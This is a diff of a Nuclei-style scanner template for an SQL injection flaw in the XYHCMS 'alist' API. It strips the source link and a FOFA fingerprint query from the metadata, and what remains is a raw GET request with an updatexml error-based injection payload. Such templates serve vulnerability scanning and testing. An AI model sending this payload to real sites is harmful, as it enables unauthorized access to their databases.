@@ -3,12 +3,8 @@ info:
   name: 行云海xyhcms alist接口存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  description: ''
   tags: sqli,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
-    fofa: body="Power by XYHCMS"
 http:
 - raw:
   - GET /index.php/Api/Lt/alist?orderby[updatexml(1,concat(0x3a,(select%20md5(123)),0x3a),1);]=1 HTTP/1.1
